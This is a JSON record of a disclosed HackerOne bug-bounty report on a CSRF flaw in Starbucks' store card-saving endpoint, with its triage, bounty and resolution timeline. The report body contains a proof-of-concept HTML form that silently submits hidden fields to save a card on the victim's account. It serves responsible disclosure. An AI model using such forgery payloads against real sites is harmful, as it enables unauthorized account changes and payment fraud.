{"id":177635,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzc2MzU=","url":"https://hackerone.com/reports/177635","title":"CSRF vulnerability in saving payment card on store.starbucks.com (COBilling -AddCreditCard)","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-10-23T12:14:07.971Z","submitted_at":"2016-10-23T12:14:07.971Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"codequick","url":"/codequick","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/009/197/530fa9e40e262bcb8cd2e0ada54eebf19b6c19f0_original.PNG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-05-15T17:10:49.615Z","bug_reporter_agreed_on_going_public_at":"2017-05-09T04:36:01.773Z","team_member_agreed_on_going_public_at":"2017-05-15T17:10:49.575Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI noticed a CSRF issue that associated with card saving. It is possible for to save card details and can be used for quick payments while purchasing. The result will be a remote attacker can trick users to use some other cards that may silently led to loss of money in which actully it is not for online shopping purpose cards. Mainly this may allow an attacker to change the card details of the online purchasing card of the victim to some important cards good scenario will be the attacker can make trick on family members itself.\n\n\n\n```\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://store.starbucks.com/on/demandware.store/Sites-Starbucks-Site/default/COBilling-AddCreditCard\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"dwfrm\u0026#95;billing\u0026#95;paymentMethods\u0026#95;creditCard\u0026#95;type\" value=\"Visa\" /\u003e\n      \u003cinput type=\"hidden\" name=\"dwfrm\u0026#95;billing\u0026#95;paymentMethods\u0026#95;creditCard\u0026#95;owner\" value=\"helloworld\" /\u003e\n      \u003cinput type=\"hidden\" name=\"dwfrm\u0026#95;billing\u0026#95;paymentMethods\u0026#95;creditCard\u0026#95;number\" value=\"███████\" /\u003e\n      \u003cinput type=\"hidden\" name=\"dwfrm\u0026#95;billing\u0026#95;paymentMethods\u0026#95;creditCard\u0026#95;month\" value=\"10\" /\u003e\n      \u003cinput type=\"hidden\" name=\"dwfrm\u0026#95;billing\u0026#95;paymentMethods\u0026#95;creditCard\u0026#95;year\" value=\"2\u0026#44;019\" /\u003e\n      \u003cinput type=\"hidden\" name=\"dwfrm\u0026#95;billing\u0026#95;paymentMethods\u0026#95;creditCard\u0026#95;saveCard\" value=\"true\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nCritical level goes from Low to medium depending on the nature of the attacker to perform this attack.","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-06-08T04:36:01.838Z","allow_singular_disclosure_after":-137063851.48147497,"singular_disclosure_allowed":true,"vote_count":10,"voters":["eveeez","apapedulimu","t4ym","japz","sumit7","codequick","sitakom","spetr0x","dolph1n","icheernoom"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1267211,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-10-25T19:23:29.874Z","updated_at":"2016-10-25T19:23:29.874Z","additional_data":{"old_title":"CSRF vulnerability in saving payment card led to misuse of mispayments on store.starbucks.com","new_title":"CSRF vulnerability in saving payment card on store.starbucks.com (COBilling -AddCreditCard)"},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267212,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @josephjose96 \n\nThank you for your submission. We are currently reviewing your submission and we'll notify you once we have an update. Thanks! ","automated_response":false,"created_at":"2016-10-25T19:23:59.964Z","updated_at":"2016-10-25T19:23:59.964Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1289264,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks again @josephjose96. We are going to work towards a fix.  ","automated_response":false,"created_at":"2016-11-08T02:33:31.300Z","updated_at":"2016-11-08T02:33:31.300Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1301365,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-11-15T23:28:38.907Z","updated_at":"2016-11-15T23:28:38.907Z","additional_data":{"old_severity":"Medium","new_severity":"Low","old_severity_id":3766,"new_severity_id":7740},"actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1301369,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @josephjose96 \n\nThanks for your patience here.  We've reviewed your report and have determined that, between the proposed low-to-medium severity, this leans more towards a low.\n\nWe're working on a fix and will be in touch as soon as it's time to re-test.  Thanks again!","automated_response":false,"created_at":"2016-11-15T23:31:36.779Z","updated_at":"2016-11-15T23:31:36.779Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Starbucks"}},"bounty_amount":"150.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"codequick","url":"/codequick"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1449095,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"any updates on resolving issue","automated_response":false,"created_at":"2017-01-28T02:18:16.798Z","updated_at":"2017-01-28T02:18:16.798Z","actor":{"username":"codequick","cleared":false,"url":"/codequick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/009/197/530fa9e40e262bcb8cd2e0ada54eebf19b6c19f0_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1558511,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"any updates on resolving issue","automated_response":false,"created_at":"2017-03-23T01:16:14.365Z","updated_at":"2017-03-23T01:16:14.365Z","actor":{"username":"codequick","cleared":false,"url":"/codequick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/009/197/530fa9e40e262bcb8cd2e0ada54eebf19b6c19f0_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1657118,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"HI @josephjose96,\n\nThanks for being patient with us. The issue has finally been resolved. Please re-test to confirm that the issue can no longer be reproduced.","automated_response":false,"created_at":"2017-05-05T18:53:36.128Z","updated_at":"2017-05-05T18:53:36.128Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"codequick","url":"/codequick"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1662157,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose","automated_response":false,"created_at":"2017-05-09T04:36:01.793Z","updated_at":"2017-05-09T04:36:01.793Z","first_to_agree":true,"actor":{"username":"codequick","cleared":false,"url":"/codequick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/009/197/530fa9e40e262bcb8cd2e0ada54eebf19b6c19f0_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1662737,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"By the way it is fixed now","automated_response":false,"created_at":"2017-05-09T10:07:01.738Z","updated_at":"2017-05-09T10:07:01.738Z","actor":{"username":"codequick","cleared":false,"url":"/codequick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/009/197/530fa9e40e262bcb8cd2e0ada54eebf19b6c19f0_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1674964,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-05-15T17:10:49.592Z","updated_at":"2017-05-15T17:10:49.592Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1674965,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-05-15T17:10:49.629Z","updated_at":"2017-05-15T17:10:49.629Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}